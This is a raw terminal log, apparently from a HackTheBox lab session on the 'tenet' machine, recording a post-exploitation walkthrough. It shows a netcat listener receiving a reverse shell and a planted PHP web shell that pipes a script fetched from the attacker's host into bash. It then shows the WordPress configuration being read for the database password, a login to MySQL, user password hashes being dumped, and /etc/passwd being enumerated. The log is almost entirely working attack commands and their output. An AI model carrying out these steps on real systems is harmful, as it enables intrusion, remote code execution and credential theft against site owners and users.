Script started on 2021-06-30 21:26:22+05:30 [TERM="screen-256color" TTY="/dev/pts/6" COLUMNS="135" LINES="33"]
                                                                                                                                       [0m[23m[24m[J[36mâ”Œâ”€â”€([1m[36m[37mircashem[0m[37m[36m)ã‰¿[33m[0m[33m[36m([33m10.10.14.20[0m[33m[36m)â”€â”€[[0m[36m[32m~/HackTheBox/tenet[0m[32m[36m]
â””â”€[1m[36m[33m$[0m[33m[39m [K[?1h=[?2004h[32mw[39m[39m [4mn[24m[24m[32mn[32mc[39m [35m-[39m[35m-[35ml[39m[35ml[35mn[39m[35mn[35mv[39m[35mv[35mp[39m 909 09[?1l>[?2004l
Listening on 0.0.0.0 9009
Connection received on 10.10.10.223 56382
bash: cannot set terminal process group (1586): Inappropriate ioctl for device
bash: no job control in this shell
www-data@tenet:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@tenet:/var/www/html$ ^Z
zsh: suspended  nc -lnvp 9009
                                                                                                                                       [0m[23m[24m[J[36mâ”Œâ”€â”€([1m[36m[37mircashem[0m[37m[36m)ã‰¿[33m[0m[33m[36m([33m10.10.14.20[0m[33m[36m)â”€â”€[[0m[36m[32m~/HackTheBox/tenet[0m[32m[36m]
â””â”€[1m[36m[33m$[0m[33m[39m [K[120C 148 [31m[1m[31mâ¨¯[0m[31m[39m 1 [33m[1m[33mâš™[0m[33m[39m[130D[?1h=[?2004h[1m[31ms[0m[39m[1m[31ms[1m[31mt[0m[39m[1m[31ms[1m[31mt[1m[31mt[0m[39m[0m[32ms[0m[32mt[0m[32mt[32my[39m [4mr[24m[24mraw [35m-[39m[35m-[35me[39m[35me[35mc[39m[35mc[35mh[39m[35mh[35mo[39m[1m[34m;[0m[39m[1m[31mf[0m[39m[0m[32mf[32mg[39m[?1l>[?2004l
[1]  + continued  nc -lnvp 9009

www-data@tenet:/var/www/html$ export TERM+xt   =xterm
www-data@tenet:/var/www/html$ [H[2Jwww-data@tenet:/var/www/html$ ls -la
total 40
drwxr-xr-x 3 www-data www-data  4096 Jun 30 15:46 .
drwxr-xr-x 3 root     root      4096 Dec 16  2020 ..
-rw-r--r-- 1 www-data www-data 10918 Dec 16  2020 index.html
-rw-r--r-- 1 www-data www-data    54 Jun 30 15:54 rev.php
-rwxr-xr-x 1 www-data www-data   514 Dec 17  2020 sator.php
-rwxr-xr-x 1 www-data www-data   514 Dec 17  2020 sator.php.bak
-rw-r--r-- 1 www-data www-data     7 Jun 30 15:54 users.txt
drwxr-xr-x 5 www-data www-data  4096 Jun 30 15:26 wordpress
www-data@tenet:/var/www/html$ cat rev.php 
<?php system('curl 10.10.14.20:8000/rev.sh | bash') ?>www-data@tenet:/var/www/html$ [H[2Jwww-data@tenet:/var/www/html$ cat rev.php ;echo
<?php system('curl 10.10.14.20:8000/rev.sh | bash') ?>
www-data@tenet:/var/www/html$ ls
index.html  rev.php  sator.php	sator.php.bak  users.txt  wordpress
www-data@tenet:/var/www/html$ cd wordpress/
www-data@tenet:/var/www/html/wordpress$ ls
index.php	 wp-blog-header.php    wp-cron.php	  wp-mail.php
license.txt	 wp-comments-post.php  wp-includes	  wp-settings.php
readme.html	 wp-config-sample.php  wp-links-opml.php  wp-signup.php
wp-activate.php  wp-config.php	       wp-load.php	  wp-trackback.php
wp-admin	 wp-content	       wp-login.php	  xmlrpc.php
www-data@tenet:/var/www/html/wordpress$ cat wp-config.php 
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'WP_HOME', 'http://tenet.htb');
define( 'WP_SITEURL', 'http://tenet.htb');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'QiuK;~(mBy7H3y8G;*|^*vGekSuuxKV$:Tc>5qKr`T}(t?+`r.+`gg,Ul,=!xy6d' );
define( 'SECURE_AUTH_KEY',  'x3q&hwYy]:S{l;jDU0D&./@]GbBz(P~}]y=3deqO1ZB/`P:GU<tJ[v)4><}wl_~N' );
define( 'LOGGED_IN_KEY',    'JrJ_u34gQ3(x7y_Db8`9%@jq<;{aqQk(Z+uZ|}M,l?6.~Fo/~Tr{0bJIW?@.*|Nu' );
define( 'NONCE_KEY',        '=z0ODLKO{9K;<,<gT[f!y_*1QgIc;#FoN}pvHNP`|hi/;cwK=vCwcC~nz&0:ajW#' );
define( 'AUTH_SALT',        '*.;XACYRMNvA?.r)f~}+A,eMke?/i^O6j$vhZA<E5Vp#N[a{YL TY^-Q[X++u@Ab' );
define( 'SECURE_AUTH_SALT', 'NtFPN?_NXFqW-Bm6Jv,v-KkjS^8Hz@BIcxc] F}(=v1$B@F/j(`b`7{A$T{DG|;h' );
define( 'LOGGED_IN_SALT',   'd14m0mBP eIawFxLs@+CrJz#d(88cx4||<6~_U3F=aCCiyN|]Hr{(mC5< R57zmn' );
define( 'NONCE_SALT',       'Srtt&}(~:K(R(q(FMK<}}%Zes!4%!S`V!KSk)Rlq{>Y?f&b`&NW[INM2,a9Zm,SH' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

www-data@tenet:/var/www/html/wordpress$ mysql Opera2112^C
www-data@tenet:/var/www/html/wordpress$ 
www-data@tenet:/var/www/html/wordpress$ ysql    mysql -u neil -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 158
Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
5 rows in set (0.00 sec)

mysql> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> select * from wp_users;
+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login  | user_pass                          | user_nicename | user_email            | user_url                     | user_registered     | user_activation_key | user_status | display_name |
+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+
|  1 | protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. | protagonist   | protagonist@tenet.htb | http://10.10.10.44/wordpress | 2020-12-16 12:17:10 |                     |           0 | protagonist  |
|  2 | neil        | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. | neil          | neil@tenet.htb        | http://tenet.htb             | 2020-12-16 14:51:26 |                     |           0 | neil neil    |
+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+
2 rows in set (0.00 sec)

mysql> select user_login , use
use                 user_id             user_pass           user_url           
user_activation_key user_login          user_registered    
user_email          user_nicename       user_status        
[Kmysql> select user_login, user_pass ,user_nick[K[Kcename from users[K[K[K[K[Kwp_users;
+-------------+------------------------------------+---------------+
| user_login  | user_pass                          | user_nicename |
+-------------+------------------------------------+---------------+
| protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. | protagonist   |
| neil        | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. | neil          |
+-------------+------------------------------------+---------------+
2 rows in set (0.00 sec)

mysql> exit
Bye
www-data@tenet:/var/www/html/wordpress$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
neil:x:1001:1001:neil,,,:/home/neil:/bin/bash
www-data@tenet:/var/www/html/wordpress$ exit
exit
www-data@tenet:/var/www/html$ exit
exit
                                                                                                                                       [0m[23m[24m[J[36mâ”Œâ”€â”€([1m[36m[37mircashem[0m[37m[36m)ã‰¿[33m[0m[33m[36m([33m10.10.14.20[0m[33m[36m)â”€â”€[[0m[36m[32m~/HackTheBox/tenet[0m[32m[36m]
â””â”€[1m[36m[33m$[0m[33m[39m [K[?1h=[?2004h[1m[31me[0m[39m[0m[32me[32mx[39m[1m[31me[1m[31mx[1m[31mi[0m[39m[0m[32me[0m[32mx[0m[32mi[32mt[39m[?1l>[?2004l

Script done on 2021-06-30 21:53:42+05:30 [COMMAND_EXIT_CODE="0"]
